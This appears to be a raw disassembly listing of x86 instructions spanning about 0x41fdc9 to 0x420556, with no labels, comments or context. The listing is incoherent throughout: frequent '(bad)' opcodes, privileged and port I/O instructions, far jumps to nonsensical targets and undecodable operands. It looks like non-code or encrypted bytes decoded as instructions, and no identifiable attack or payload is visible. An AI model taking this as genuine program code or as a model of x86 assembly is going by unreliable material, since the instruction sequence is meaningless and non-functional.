  41fdc9:	loop   0x41fe1d
  41fdcb:	rcr    DWORD PTR [eax+0x3203f552],1
  41fdd1:	xchg   edx,eax
  41fdd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdd3:	call   0x60ce2fcf
  41fdd8:	shr    DWORD PTR [ebp-0x73209224],cl
  41fdde:	xchg   edx,eax
  41fddf:	and    eax,0x99eb4369
  41fde4:	sub    edx,DWORD PTR [edx+0x5417d9e2]
  41fdea:	fmul   QWORD PTR [ecx-0x66744b98]
  41fdf0:	jbe    0x41fe42
  41fdf2:	sahf   
  41fdf3:	cli    
  41fdf4:	hlt    
  41fdf5:	in     al,0x28
  41fdf7:	add    eax,DWORD PTR [ecx]
  41fdf9:	(bad)  
  41fdfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdfb:	xlat   BYTE PTR ds:[ebx]
  41fdfc:	mov    esp,0x87cb8665
  41fe01:	sbb    ah,bl
  41fe03:	xchg   BYTE PTR [ebx+eax*2-0x2773cc1b],ah
  41fe0a:	lods   al,BYTE PTR ds:[esi]
  41fe0b:	or     bh,bl
  41fe0d:	nop
  41fe0e:	ffree  st(2)
  41fe10:	clc    
  41fe11:	arpl   WORD PTR ds:0x39ae076f,si
  41fe17:	mov    ?,WORD PTR [eax+0x28]
  41fe1a:	mov    edi,DWORD PTR [ebp-0x195e8930]
  41fe20:	pop    ecx
  41fe21:	call   0xd069be39
  41fe26:	dec    ebp
  41fe27:	xchg   ebx,eax
  41fe28:	mov    ds:0x87a5ae4,eax
  41fe2d:	adc    eax,0x9adf52c
  41fe32:	add    eax,0x641ce335
  41fe37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe38:	inc    ebp
  41fe39:	pop    ebp
  41fe3a:	in     al,dx
  41fe3b:	les    ebx,FWORD PTR [edx+0x3e24890e]
  41fe41:	add    eax,0xcf420203
  41fe46:	mov    cl,0xbf
  41fe48:	jne    0x41fe02
  41fe4a:	xor    edi,ecx
  41fe4c:	dec    BYTE PTR [ecx]
  41fe4e:	sub    ah,BYTE PTR [ebx-0x76]
  41fe51:	scas   al,BYTE PTR es:[edi]
  41fe52:	fcom   DWORD PTR [edi+0x57]
  41fe55:	sub    DWORD PTR [ebx],edi
  41fe57:	sti    
  41fe58:	and    DWORD PTR [esi+0x23],eax
  41fe5b:	inc    eax
  41fe5c:	sub    al,0x44
  41fe5e:	cdq    
  41fe5f:	add    bh,cl
  41fe61:	(bad)  
  41fe63:	sahf   
  41fe64:	push   ds
  41fe65:	jge    0x41fe72
  41fe67:	(bad)  
  41fe68:	jb     0x41fe25
  41fe6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe6b:	pop    eax
  41fe6c:	arpl   WORD PTR [esi-0x73],cx
  41fe6f:	int    0xd6
  41fe71:	push   0xffffffd4
  41fe73:	pusha  
  41fe74:	mov    eax,ds:0xf4978b1f
  41fe79:	jmp    0x41fe67
  41fe7b:	push   ecx
  41fe7c:	fsub   DWORD PTR [edi+0x17c0147f]
  41fe82:	fwait
  41fe83:	jb     0x41fe93
  41fe85:	push   edi
  41fe86:	mov    bl,0xae
  41fe88:	dec    ebp
  41fe89:	repnz dec eax
  41fe8b:	jns    0x41fe5d
  41fe8d:	and    esi,0xffffffef
  41fe90:	mov    ah,0x20
  41fe92:	mov    ch,0x38
  41fe94:	jne    0x41fede
  41fe96:	mov    edx,0xd3491d98
  41fe9b:	jmp    0x9c41:0x9966010f
  41fea2:	dec    ebx
  41fea3:	adc    DWORD PTR [edx+0x13],0xffffffd9
  41fea7:	mov    eax,0xaf70218e
  41feac:	outs   dx,BYTE PTR ds:[esi]
  41fead:	retf   
  41feae:	push   ecx
  41feaf:	mov    cl,0x82
  41feb1:	inc    ecx
  41feb2:	ins    BYTE PTR es:[edi],dx
  41feb3:	enter  0x7ae0,0x41
  41feb7:	cli    
  41feb8:	xchg   ebp,eax
  41feb9:	inc    ebx
  41feba:	inc    ebx
  41febb:	fcomip st,st(7)
  41febd:	push   ebp
  41febe:	shl    BYTE PTR [ecx+0x5a],0x4a
  41fec2:	add    al,0x94
  41fec4:	or     eax,0xe94c8612
  41fec9:	mov    dh,0x71
  41fecb:	sbb    eax,0xf75e6c7e
  41fed0:	mov    ebx,0xc77ebf9
  41fed5:	push   ebp
  41fed6:	nop
  41fed7:	jle    0x41fe94
  41fed9:	in     eax,0xfd
  41fedb:	lds    eax,FWORD PTR [ebp+0x612709b]
  41fee1:	fs push ds
  41fee3:	jo     0x41fef6
  41fee5:	outs   dx,BYTE PTR ds:[esi]
  41fee6:	lock jg 0x41fea2
  41fee9:	shl    DWORD PTR [eax],0x5c
  41feec:	outs   dx,BYTE PTR ds:[esi]
  41feed:	fisub  DWORD PTR [ebx-0x6c2e6603]
  41fef3:	xchg   ecx,eax
  41fef4:	ds ss mov bl,0x40
  41fef8:	pop    esp
  41fef9:	mov    edx,0xcc53a0dc
  41fefe:	sub    dl,BYTE PTR [esi+0x3c49edb2]
  41ff04:	mov    cl,0x7
  41ff06:	dec    eax
  41ff07:	call   0x49b:0xf5feec9a
  41ff0e:	xor    BYTE PTR [ebx-0x2cd6abcc],dh
  41ff14:	mov    ecx,0x366d9377
  41ff19:	(bad)  [ebp+eiz*8+0x4cc060e4]
  41ff20:	sub    ah,cl
  41ff22:	adc    al,0xa9
  41ff24:	push   ecx
  41ff25:	je     0x41ff4e
  41ff27:	and    bh,0x33
  41ff2a:	cdq    
  41ff2b:	shr    ebp,cl
  41ff2d:	dec    edi
  41ff2e:	mov    BYTE PTR [ebx],cl
  41ff30:	retf   
  41ff31:	mov    dh,0x5d
  41ff33:	pushf  
  41ff34:	retf   
  41ff35:	cmc    
  41ff36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff37:	rol    BYTE PTR [eax+0x33],1
  41ff3a:	sbb    DWORD PTR [edx+edx*8],ebp
  41ff3d:	dec    ebx
  41ff3e:	xchg   edx,eax
  41ff3f:	cmp    BYTE PTR [edi+0x15],bh
  41ff42:	retf   0x11bc
  41ff45:	dec    edx
  41ff46:	rcl    BYTE PTR [eax],1
  41ff48:	add    BYTE PTR [ebx-0x29a3cf7c],ah
  41ff4e:	mov    edx,0x1c256a1e
  41ff53:	in     al,dx
  41ff54:	arpl   WORD PTR [esi+edi*8],bp
  41ff57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff58:	or     ebp,0x22
  41ff5b:	(bad)  
  41ff5c:	enter  0x3fa4,0xeb
  41ff60:	cdq    
  41ff61:	sub    al,0xa
  41ff63:	add    dl,BYTE PTR [edx+edi*8-0x2a]
  41ff67:	je     0x41ff60
  41ff69:	(bad)  
  41ff6a:	push   ecx
  41ff6b:	xchg   ebx,eax
  41ff6c:	cmc    
  41ff6d:	xchg   ebp,eax
  41ff6e:	dec    ebx
  41ff6f:	das    
  41ff70:	imul   esp,DWORD PTR [ebp+0x8],0x6d
  41ff74:	(bad)  
  41ff75:	cmc    
  41ff76:	sbb    al,0x55
  41ff78:	mov    bl,0x60
  41ff7a:	ins    BYTE PTR es:[edi],dx
  41ff7b:	jmp    0x6c72a7e1
  41ff80:	pop    ecx
  41ff81:	cwde   
  41ff82:	hlt    
  41ff83:	sbb    ch,BYTE PTR [eax]
  41ff85:	int    0xc8
  41ff87:	stc    
  41ff88:	sub    al,0x84
  41ff8a:	xchg   esi,eax
  41ff8b:	xlat   BYTE PTR ds:[ebx]
  41ff8d:	(bad)  
  41ff8e:	iret   
  41ff8f:	ret    0xc90a
  41ff92:	addr16 push eax
  41ff94:	popa   
  41ff95:	dec    ebx
  41ff96:	lods   al,BYTE PTR ds:[esi]
  41ff97:	xchg   cx,ax
  41ff99:	inc    edi
  41ff9a:	in     eax,dx
  41ff9b:	add    al,BYTE PTR [eax-0x2cfc131d]
  41ffa1:	cs ins BYTE PTR es:[edi],dx
  41ffa3:	retf   0x3bc4
  41ffa6:	loop   0x41fff1
  41ffa8:	shl    ch,1
  41ffaa:	mov    gs,edi
  41ffac:	bound  esi,QWORD PTR [esi]
  41ffae:	aaa    
  41ffaf:	(bad)  
  41ffb0:	push   ecx
  41ffb1:	push   ecx
  41ffb2:	ret    
  41ffb3:	add    al,0x4b
  41ffb5:	faddp  st(7),st
  41ffb7:	jbe    0x41fffb
  41ffb9:	call   0xe36:0xa9e66bea
  41ffc0:	pusha  
  41ffc1:	nop
  41ffc2:	lds    ebx,FWORD PTR [esi+0x1ebcef61]
  41ffc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffc9:	or     edi,DWORD PTR [edx-0x6c]
  41ffcc:	cwde   
  41ffcd:	aam    0x65
  41ffcf:	add    al,0xa3
  41ffd1:	push   ss
  41ffd2:	pop    ebp
  41ffd3:	xlat   BYTE PTR ds:[ebx]
  41ffd4:	sub    eax,0x676acce2
  41ffd9:	pop    esi
  41ffda:	lds    ebp,FWORD PTR [ebp-0x22d636a5]
  41ffe0:	fldenv [edx+0x65]
  41ffe3:	icebp  
  41ffe4:	cli    
  41ffe5:	and    BYTE PTR [ebx],dh
  41ffe7:	mov    dl,0x7e
  41ffe9:	nop
  41ffea:	push   0xffffffb0
  41ffec:	and    BYTE PTR [edx+eax*4],ch
  41ffef:	pop    esi
  41fff0:	repnz push ss
  41fff2:	pop    es
  41fff3:	sbb    eax,0xf05b8e5f
  41fff8:	lea    esp,[edi-0x498dec3f]
  41fffe:	call   0x360d:0xc4070fc7
  420005:	int3   
  420006:	out    dx,eax
  420007:	int3   
  420008:	pop    ss
  420009:	pop    ebp
  42000a:	mov    esi,0x3de8f212
  42000f:	pop    esi
  420010:	cmp    eax,0x75017e00
  420015:	imul   edi,esp,0xffffffe0
  420018:	sahf   
  420019:	cmp    al,BYTE PTR [ecx-0x53]
  42001c:	shl    BYTE PTR [ecx-0x7a],0xc1
  420020:	inc    BYTE PTR [edx+eiz*8+0x7d295b2e]
  420027:	aad    0xb
  420029:	sar    DWORD PTR [esi],0x75
  42002c:	inc    ebx
  42002d:	push   esp
  42002e:	js     0x420043
  420030:	je     0x42005c
  420032:	test   DWORD PTR [edi-0x5f],esi
  420035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420036:	std    
  420037:	ja     0x420057
  420039:	or     DWORD PTR [eax+0x47],edi
  42003c:	mov    DWORD PTR [esi+eiz*8],eax
  42003f:	ins    DWORD PTR es:[edi],dx
  420040:	pop    edi
  420041:	inc    esp
  420042:	mov    ecx,edi
  420044:	pop    esp
  420045:	mov    ds:0xd502f20a,al
  42004a:	(bad)  
  42004b:	aad    0x8d
  42004d:	mov    esp,0xf2db41c0
  420052:	pavgw  mm6,QWORD PTR [ecx]
  420055:	gs in  al,dx
  420057:	fcomp  DWORD PTR [esi-0x16e11071]
  42005d:	cmp    eax,0xf452a7f7
  420062:	mov    ebx,0xf21ae64c
  420067:	or     ecx,DWORD PTR [edi-0x76]
  42006a:	arpl   WORD PTR [ecx-0x47743bf9],ax
  420070:	inc    ebx
  420071:	int    0x84
  420073:	clc    
  420074:	popa   
  420075:	xchg   BYTE PTR [ebx-0x766ccbd1],cl
  42007b:	ja     0x4200c2
  42007d:	repnz xchg al,bh
  420080:	dec    edx
  420081:	fwait
  420082:	jmp    0xa5d0665c
  420087:	cmp    DWORD PTR [ecx-0x392bf5b1],ebx
  42008d:	mov    ebp,0x4f0ecabe
  420092:	and    eax,eax
  420094:	mov    ebx,0xeb2ca617
  420099:	mov    bl,0xde
  42009b:	mov    ds,WORD PTR [ebp+0x7b6525ca]
  4200a1:	inc    ebp
  4200a2:	cmp    eax,0xe80ab677
  4200a7:	or     edx,eax
  4200a9:	sub    eax,0xad4444dc
  4200ae:	pop    ecx
  4200af:	rol    BYTE PTR [ecx],0x54
  4200b2:	inc    edx
  4200b3:	int3   
  4200b4:	aam    0x69
  4200b6:	and    eax,0x4f93380e
  4200bb:	lahf   
  4200bc:	aam    0x4b
  4200be:	mov    ebp,DWORD PTR [ecx-0x35]
  4200c1:	dec    edi
  4200c2:	push   ss
  4200c3:	mov    ch,BYTE PTR [ebp+0x7d5f8510]
  4200c9:	sbb    BYTE PTR [esi+esi*8],bl
  4200cc:	cmp    eax,0x7b152e97
  4200d1:	outs   dx,DWORD PTR ds:[esi]
  4200d2:	out    dx,al
  4200d3:	fs push 0x77
  4200d6:	mov    bl,0x5d
  4200d8:	mov    edi,0x251d7acb
  4200dd:	or     DWORD PTR [esi+0x3cfb02d9],0xffffffc2
  4200e4:	adc    eax,DWORD PTR [ebx]
  4200e6:	in     al,0x17
  4200e8:	(bad)  
  4200e9:	jo     0x42010c
  4200eb:	xor    ah,BYTE PTR [edx+0x36]
  4200ee:	xor    eax,0x1b9d078
  4200f3:	add    eax,0x8c3eeedf
  4200f8:	iret   
  4200f9:	mov    esi,0x7b1440cb
  4200fe:	mov    BYTE PTR [eax-0x2098d07a],cl
  420104:	inc    esp
  420105:	add    DWORD PTR [ecx+0x286d6cc7],ecx
  42010b:	dec    ecx
  42010c:	cmp    edi,eax
  42010e:	nop
  42010f:	pop    edi
  420110:	mov    dl,0xdc
  420112:	inc    eax
  420113:	(bad)
  420117:	jge    0x42009b
  420119:	jmp    0x3f14c3bb
  42011e:	outs   dx,BYTE PTR ds:[esi]
  42011f:	cli    
  420120:	sbb    eax,0xd8b132ba
  420125:	mov    dl,0xc7
  420127:	cmc    
  420128:	adc    BYTE PTR [eax-0x45],al
  42012b:	out    0x66,eax
  42012d:	mov    al,ds:0x39aaace2
  420132:	xchg   ebx,eax
  420133:	enter  0x8080,0x78
  420137:	adc    al,0x9
  420139:	adc    edx,DWORD PTR [edx]
  42013b:	test   eax,0x55c609d0
  420140:	scas   al,BYTE PTR es:[edi]
  420141:	xchg   edi,eax
  420142:	jl     0x4200c7
  420144:	dec    ecx
  420145:	(bad)  
  420147:	mov    dl,0xcb
  420149:	gs hlt 
  42014b:	sub    ch,BYTE PTR [esi]
  42014d:	sub    al,0xf9
  42014f:	and    al,0x44
  420151:	or     bl,BYTE PTR [esi-0x52d057a1]
  420157:	pop    ss
  420158:	cmc    
  420159:	push   ebx
  42015a:	ja     0x420193
  42015c:	imul   ecx,DWORD PTR [ecx+0x5e],0x40
  420160:	and    al,0x1e
  420162:	push   cs
  420163:	xchg   edx,eax
  420164:	jp     0x4201a0
  420166:	mov    ah,0xef
  420168:	sbb    al,0x91
  42016a:	bound  edx,QWORD PTR [esi-0x5e]
  42016d:	or     esi,esp
  42016f:	sub    al,0x9b
  420171:	cmp    BYTE PTR ds:0xcb206f28,dh
  420177:	or     BYTE PTR [esi+0xc],al
  42017a:	cs pop edx
  42017c:	ret    
  42017d:	jno    0x4201da
  42017f:	or     al,0xa1
  420181:	jg     0x420152
  420183:	cmp    BYTE PTR ds:0x88b4f676,ch
  420189:	adc    edx,esi
  42018b:	fisubr WORD PTR [edx+0x3ae665c3]
  420191:	inc    esi
  420192:	sar    esi,cl
  420194:	mov    ebp,0xe8f4cead
  420199:	pop    ebp
  42019a:	in     al,0x2e
  42019c:	pop    esi
  42019d:	mov    WORD PTR [ebp+0x7b],ds
  4201a0:	dec    edi
  4201a1:	cmp    al,0x11
  4201a3:	adc    DWORD PTR [edi+0x1193d6c4],ebp
  4201a9:	jae    0x4201d6
  4201ab:	lsl    ecx,si
  4201ae:	mov    cl,0x15
  4201b0:	mov    ecx,0x8fd4b7df
  4201b5:	(bad)  
  4201b7:	xchg   ebx,eax
  4201b8:	les    eax,FWORD PTR [esi]
  4201ba:	or     BYTE PTR [esi+0x6e],bh
  4201bd:	scas   al,BYTE PTR es:[edi]
  4201be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201bf:	mov    cl,0x93
  4201c1:	lods   al,BYTE PTR ds:[esi]
  4201c2:	dec    edx
  4201c3:	int3   
  4201c4:	clc    
  4201c5:	imul   ecx,DWORD PTR [eax-0x7d6148c9],0xffffffc6
  4201cc:	jmp    0x6eb18c0c
  4201d1:	cwde   
  4201d2:	push   esp
  4201d3:	xchg   cl,cl
  4201d5:	pop    ebp
  4201d6:	(bad)  
  4201d7:	sahf   
  4201d8:	or     BYTE PTR [edi-0x3412a0ed],dh
  4201de:	dec    esi
  4201df:	sub    edx,DWORD PTR [esi-0x559d8566]
  4201e5:	jl     0x42023c
  4201e7:	shl    BYTE PTR [edx],cl
  4201e9:	int3   
  4201ea:	aad    0xab
  4201ec:	lds    edx,FWORD PTR [edx-0x32489f6e]
  4201f2:	fadd   QWORD PTR [edi-0x45934f5d]
  4201f8:	aaa    
  4201f9:	jl     0x4201c4
  4201fb:	imul   edx,DWORD PTR [esi-0x34],0x6b1cfb8c
  420202:	mov    ecx,0x97539988
  420207:	cmp    al,0x61
  420209:	adc    ebp,DWORD PTR [esi-0x8]
  42020c:	enter  0x91e0,0xcc
  420210:	xor    ecx,eax
  420212:	sbb    BYTE PTR [ebx-0x21],ah
  420215:	scas   eax,DWORD PTR es:[edi]
  420216:	lea    ebp,[ebx+eiz*8-0x7]
  42021a:	call   0xbec3:0x1ff4e22f
  420221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420222:	xor    esi,DWORD PTR [ecx-0x203564a9]
  420228:	or     BYTE PTR [ebp-0x16],bl
  42022b:	fsub   st,st(1)
  42022d:	mov    ch,0xc2
  42022f:	inc    ebp
  420230:	xor    ecx,ebx
  420232:	adc    BYTE PTR [esi],0x32
  420235:	mov    eax,0xa7636810
  42023a:	or     BYTE PTR [esi+esi*8-0x4f02b397],al
  420241:	jecxz  0x42021e
  420243:	mov    ebx,DWORD PTR [ebp-0x6c]
  420246:	jnp    0x420257
  420248:	cli    
  420249:	loope  0x4202c1
  42024b:	iret   
  42024c:	idiv   esi
  42024e:	pop    ss
  42024f:	cmc    
  420250:	div    BYTE PTR [edi]
  420252:	ja     0x420241
  420254:	xor    ch,al
  420256:	xor    esp,edi
  420258:	popf   
  420259:	out    dx,al
  42025a:	add    esi,edi
  42025c:	ret    0x99
  42025f:	das    
  420260:	into   
  420261:	jb     0x4202c6
  420263:	mov    WORD PTR [ebp+0xb],?
  420266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420267:	mov    ds:0x9132dfdd,al
  42026c:	pop    esp
  42026d:	outs   dx,BYTE PTR ds:[esi]
  42026e:	push   0xfea9e2fc
  420273:	inc    ebp
  420274:	xor    al,0x88
  420276:	dec    eax
  420277:	inc    ebp
  420278:	pop    esp
  420279:	pop    ebx
  42027a:	adc    eax,ecx
  42027c:	and    DWORD PTR [edx+0x1b570700],esi
  420282:	ficom  WORD PTR ds:0xd4f0578
  420288:	sbb    cl,BYTE PTR [ebx-0x4c643a8]
  42028e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42028f:	xchg   ecx,eax
  420290:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420291:	stos   WORD PTR es:[edi],ax
  420293:	fbstp  TBYTE PTR [esi]
  420295:	xchg   ebp,eax
  420296:	popa   
  420297:	fwait
  420298:	lods   eax,DWORD PTR ds:[esi]
  420299:	sar    DWORD PTR [edi+0x46da5ea3],1
  42029f:	add    DWORD PTR [ebx+0x2be1ee44],ebx
  4202a5:	fcmovnu st,st(3)
  4202a7:	cmp    al,0x95
  4202a9:	pop    edi
  4202aa:	fdivr  QWORD PTR [ecx]
  4202ac:	ret    
  4202ad:	enter  0xf76,0xbd
  4202b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202b2:	jl     0x420263
  4202b4:	clc    
  4202b5:	aaa    
  4202b6:	or     DWORD PTR [edx-0x9211d97],eax
  4202bc:	lods   eax,DWORD PTR ds:[esi]
  4202bd:	(bad)  
  4202be:	mov    WORD PTR [edi],?
  4202c0:	in     eax,0xa1
  4202c2:	sub    eax,0xbdc551cb
  4202c7:	push   edi
  4202c8:	imul   ebx,DWORD PTR [edi-0x54d58b29],0xffffffcc
  4202cf:	cli    
  4202d0:	(bad)  
  4202d1:	ins    DWORD PTR es:[edi],dx
  4202d2:	cmc    
  4202d3:	outs   dx,DWORD PTR ds:[esi]
  4202d4:	std    
  4202d5:	push   ss
  4202d6:	pop    ebp
  4202d7:	add    DWORD PTR [edi+0x51],0x13
  4202db:	dec    edi
  4202dc:	bound  eax,QWORD PTR [ebp-0x698245d4]
  4202e2:	dec    esp
  4202e3:	pop    edi
  4202e4:	and    ch,dl
  4202e6:	lods   al,BYTE PTR ds:[esi]
  4202e7:	xchg   ecx,eax
  4202e8:	mov    al,0xd4
  4202ea:	aaa    
  4202eb:	in     al,dx
  4202ec:	ins    BYTE PTR es:[edi],dx
  4202ed:	retf   
  4202ee:	stos   BYTE PTR es:[edi],al
  4202ef:	dec    ebp
  4202f0:	adc    al,0x86
  4202f2:	mov    edx,0x76a83db3
  4202f7:	or     al,0xae
  4202f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202fa:	sbb    ebp,ecx
  4202fc:	out    0x57,al
  4202fe:	xchg   esi,eax
  4202ff:	adc    cl,BYTE PTR [edi]
  420301:	sub    ebp,DWORD PTR [edi+0x73]
  420304:	push   ebp
  420305:	xor    eax,0x8d9b9001
  42030a:	arpl   bp,bx
  42030c:	xor    DWORD PTR [edx+0x66],ecx
  42030f:	bswap  esp
  420311:	or     al,0xfa
  420313:	daa    
  420314:	xor    ch,BYTE PTR [ebx+0x43]
  420317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420318:	mov    ebp,0xe2fa0785
  42031d:	cmp    BYTE PTR [ebx+ecx*1],bh
  420320:	imul   ebx,DWORD PTR [edi],0xffffff8e
  420323:	dec    ebp
  420324:	cmc    
  420325:	mov    ds:0x2014bb11,al
  42032a:	ret    
  42032b:	call   0x6ccd:0x2e6e043c
  420332:	adc    bh,dl
  420334:	jb     0x420318
  420336:	in     eax,0x58
  420338:	pusha  
  420339:	xchg   edi,eax
  42033a:	jnp    0x4202ce
  42033c:	jge    0x420383
  42033e:	push   ebx
  42033f:	cmp    eax,0xc3e3d8d3
  420344:	add    al,0x21
  420346:	mov    bh,0x74
  420348:	lea    edi,ds:0xc0a569de
  42034e:	loope  0x42035d
  420350:	jle    0x420367
  420352:	(bad)  
  420353:	out    0xac,al
  420355:	test   DWORD PTR [edx],esi
  420357:	js     0x42031d
  420359:	adc    esp,esp
  42035b:	jmp    0x4203b5
  42035d:	test   eax,0x32165517
  420362:	push   ebp
  420363:	outs   dx,DWORD PTR ds:[esi]
  420364:	mov    ebp,0x3d0988f9
  420369:	adc    ebx,ecx
  42036b:	into   
  42036c:	xchg   DWORD PTR [edi-0x5e6990da],esp
  420372:	mov    dh,0xdc
  420374:	add    eax,0x5cd84255
  420379:	sbb    eax,0x4a644c9c
  42037e:	mov    BYTE PTR [edx],al
  420380:	push   esp
  420381:	pop    ds
  420382:	sub    dh,BYTE PTR [ecx]
  420384:	aas    
  420385:	push   ss
  420386:	lods   al,BYTE PTR ds:[esi]
  420387:	mov    bh,0x4d
  420389:	mov    dh,0x80
  42038b:	push   es
  42038c:	out    dx,eax
  42038d:	inc    edi
  42038e:	mov    eax,0x5b943eec
  420393:	not    BYTE PTR [ebp+0x1388fe0c]
  420399:	inc    eax
  42039a:	test   al,0x5c
  42039c:	rcl    ch,0xb8
  42039f:	cmp    al,0xb
  4203a1:	xchg   bh,dl
  4203a3:	jb     0x42034f
  4203a5:	fsubp  st(2),st
  4203a7:	pop    es
  4203a8:	leave  
  4203a9:	fs mov esi,0x11236fc7
  4203af:	or     ebp,DWORD PTR [edi-0x36297906]
  4203b5:	jb     0x420421
  4203b7:	and    eax,0x2316c864
  4203bc:	xchg   edi,eax
  4203bd:	popf   
  4203be:	cs mov edi,0x6c031f46
  4203c4:	or     eax,0x5bf58b68
  4203c9:	jno    0x420425
  4203cb:	ja     0x42037f
  4203cd:	stos   BYTE PTR es:[edi],al
  4203ce:	jmp    0x2867:0x5c54e3
  4203d5:	stos   DWORD PTR es:[edi],eax
  4203d6:	loope  0x42043a
  4203d8:	jl     0x4203ce
  4203da:	popa   
  4203db:	mov    esp,0xe3e5b10a
  4203e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203e1:	mov    eax,ds:0xc76a7ec7
  4203e6:	data16 test BYTE PTR [ebp+0x6ff407f5],bh
  4203ed:	shl    BYTE PTR [ebp+ecx*2-0x7f],1
  4203f1:	inc    edx
  4203f2:	sbb    al,0x6b
  4203f4:	dec    edx
  4203f5:	pop    esp
  4203f6:	fbstp  TBYTE PTR [edi+ecx*2+0x5a9c2a8b]
  4203fd:	lods   eax,DWORD PTR ds:[esi]
  4203fe:	cdq    
  4203ff:	inc    eax
  420400:	fisttp WORD PTR [esi]
  420402:	mov    eax,ds:0x9a1d400e
  420407:	fnstenv [esi]
  420409:	mov    edx,0x11a57261
  42040e:	mov    esp,0xfcf49228
  420413:	push   eax
  420414:	loop   0x4203b5
  420416:	mov    ebx,0xbef7ecfb
  42041b:	lods   al,BYTE PTR ds:[esi]
  42041c:	sub    dh,ch
  42041e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42041f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420420:	pop    edx
  420421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420422:	mov    ds:0xf300ada1,eax
  420427:	pop    edi
  420428:	in     al,dx
  420429:	cmp    BYTE PTR [ecx+ebx*2-0x12d5aa00],al
  420430:	imul   edi,esi,0x8581d8c8
  420436:	lea    edx,[ebx+edi*4+0x6acda1e]
  42043d:	inc    ebx
  42043e:	aas    
  42043f:	push   ebx
  420440:	(bad)  
  420442:	enter  0xd494,0x1e
  420446:	pop    ebp
  420447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420448:	dec    ebx
  420449:	sbb    BYTE PTR [di+0x78],0x24
  42044e:	xor    BYTE PTR [eax],ah
  420450:	std    
  420451:	jmp    0x35c6b7ea
  420456:	in     al,dx
  420457:	lds    esp,FWORD PTR [esi-0x3591df35]
  42045d:	retf   
  42045e:	ins    BYTE PTR es:[edi],dx
  42045f:	dec    ecx
  420460:	jmp    0x420436
  420462:	inc    DWORD PTR [ecx]
  420464:	scas   al,BYTE PTR es:[edi]
  420465:	idiv   bl
  420467:	aad    0xd3
  420469:	addr16 cld 
  42046b:	cwde   
  42046c:	in     al,dx
  42046d:	jge    0x420416
  42046f:	xchg   edx,eax
  420470:	popa   
  420471:	inc    ebx
  420472:	push   ds
  420473:	xor    bl,BYTE PTR [edx-0x7b9ea942]
  420479:	push   edx
  42047a:	sti    
  42047b:	out    0x7,eax
  42047d:	fst    QWORD PTR [edx]
  42047f:	xchg   ecx,eax
  420480:	std    
  420481:	fwait
  420482:	cmp    ecx,DWORD PTR [eax+0x55]
  420485:	inc    esi
  420486:	in     eax,dx
  420487:	(bad)  
  420488:	jle    0x42044f
  42048a:	cmp    ebx,edi
  42048c:	mov    bh,0x37
  42048e:	and    DWORD PTR [edx+0x57],ebp
  420491:	sahf   
  420492:	mov    DWORD PTR [edi+0x64],ebp
  420495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420496:	pop    ebp
  420497:	push   ds
  420498:	(bad)  
  420499:	aad    0xea
  42049b:	sbb    al,0x65
  42049d:	jno    0x4204ca
  42049f:	xlat   BYTE PTR ds:[ebx]
  4204a0:	push   edi
  4204a1:	jle    0x4204d5
  4204a3:	ss xchg esp,eax
  4204a5:	in     eax,dx
  4204a6:	(bad)  
  4204a7:	xchg   esp,eax
  4204a8:	and    ebp,DWORD PTR [edx+0xb7bb802]
  4204ae:	mov    bh,0xb2
  4204b0:	add    ebx,0x631e962d
  4204b6:	in     al,0x1c
  4204b8:	cmp    eax,0x79ebfab0
  4204bd:	push   edx
  4204be:	mov    eax,ds:0x51b6fdb5
  4204c3:	fnstenv [edi+0x5c1ba005]
  4204c9:	mov    ecx,0x404d78d2
  4204ce:	sbb    BYTE PTR [eax+0x76209429],bh
  4204d4:	mov    ch,0x7b
  4204d6:	lfs    esi,FWORD PTR [eax+eiz*4+0x33071866]
  4204de:	call   0x240:0x5567adfa
  4204e5:	or     BYTE PTR [edi+0x43],cl
  4204e8:	push   ecx
  4204e9:	xor    DWORD PTR [esi+0x1f86fe7c],edi
  4204ef:	retfw  0x3a45
  4204f3:	(bad)  [eax-0x42aefd79]
  4204f9:	retf   
  4204fa:	and    DWORD PTR [ebx],esp
  4204fc:	and    BYTE PTR ds:[edx],0xa4
  420500:	aas    
  420501:	mov    edx,0xe41a90be
  420506:	(bad)  
  420507:	push   esp
  420508:	aam    0x15
  42050a:	out    0xc4,eax
  42050c:	dec    edi
  42050d:	(bad)  
  42050e:	sahf   
  42050f:	scas   al,BYTE PTR es:[edi]
  420510:	cdq    
  420511:	adc    DWORD PTR [esi+0x7],esp
  420514:	mov    ds:0x3b6690cb,eax
  420519:	mov    ah,0x6c
  42051b:	(bad)  
  42051d:	(bad)
  420521:	out    0xfd,eax
  420523:	inc    edx
  420524:	and    edx,edi
  420526:	std    
  420527:	cdq    
  420528:	ss mov ch,0x51
  42052b:	jns    0x42054d
  42052d:	push   edi
  42052e:	add    bh,BYTE PTR [ebx+0x8e5319c]
  420534:	and    ecx,DWORD PTR [ebp-0x641c33f5]
  42053a:	test   DWORD PTR [edx],esi
  42053c:	xchg   ebx,eax
  42053d:	mov    DWORD PTR [edx+0x3338d6be],ebx
  420543:	into   
  420544:	jmp    0x4216fdd4
  420549:	cli    
  42054a:	pusha  
  42054b:	xor    BYTE PTR [esi-0x1],bl
  42054e:	mov    BYTE PTR [edx-0x1df6a204],0xf2
  420555:	(bad)  
  420556:	xlat   BYTE PTR ds:[ebx]
